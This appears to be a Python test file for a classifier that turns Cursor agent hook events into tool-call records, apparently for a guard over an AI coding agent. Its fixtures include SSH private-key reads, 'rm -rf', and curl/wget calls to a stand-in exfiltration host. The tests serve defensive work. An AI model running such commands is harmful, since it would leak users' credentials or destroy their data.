#!/usr/bin/env python3
"""Classify Cursor hook payloads into Gurdy tools/call shapes."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "hooks"))

from classify import classify


def eq(got, want, label: str) -> None:
    if got != want:
        raise SystemExit(f"{label}: got {got!r} want {want!r}")


def main() -> int:
    eq(
        classify(
            {
                "hook_event_name": "beforeReadFile",
                "file_path": "/Users/u/.ssh/id_rsa",
            }
        ),
        {"tool": "read_file", "arguments": {"path": "/Users/u/.ssh/id_rsa"}},
        "ssh read",
    )
    eq(
        classify({"hook_event_name": "beforeShellExecution", "command": "rm -rf /tmp/x"}),
        {"tool": "rm", "arguments": {"path": "/tmp/x"}},
        "rm",
    )
    eq(
        classify(
            {
                "hook_event_name": "beforeShellExecution",
                "command": "cat ~/.ssh/id_rsa",
            }
        )["tool"],
        "read_file",
        "cat ssh key",
    )
    eq(
        classify({"tool_name": "Delete", "tool_input": {"path": "/workspace/a.md"}}),
        {"tool": "delete_file", "arguments": {"path": "/workspace/a.md"}},
        "delete",
    )
    eq(
        classify({"tool_name": "MCP:jira_search", "mcp_server_name": "atlassian"}),
        None,
        "skip mcp",
    )
    eq(
        classify(
            {
                "hook_event_name": "beforeMCPExecution",
                "tool_name": "read_file",
                "file_path": "/Users/u/.ssh/id_rsa",
            }
        ),
        None,
        "skip mcp hook",
    )
    eq(
        classify(
            {
                "tool_name": "WebFetch",
                "tool_input": {"url": "https://exfil.example/drop"},
            }
        ),
        {"tool": "webfetch", "arguments": {"url": "https://exfil.example/drop"}},
        "webfetch",
    )
    eq(
        classify(
            {
                "tool_name": "Glob",
                "tool_input": {"target_directory": "/Users/u/.ssh"},
            }
        ),
        {"tool": "read_file", "arguments": {"path": "/Users/u/.ssh"}},
        "glob dir",
    )
    eq(
        classify({"hook_event_name": "beforeSubmitPrompt", "model": "gpt-5"}),
        None,
        "prompt is not llm/completion",
    )
    eq(
        classify(
            {
                "hook_event_name": "beforeShellExecution",
                "command": "curl -s https://exfil.example/drop",
            }
        ),
        {"tool": "http_fetch", "arguments": {"url": "https://exfil.example/drop"}},
        "curl",
    )
    eq(
        classify(
            {
                "hook_event_name": "beforeShellExecution",
                "command": "sudo wget https://exfil.example/x",
            }
        )["tool"],
        "http_fetch",
        "sudo wget",
    )
    print("ok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
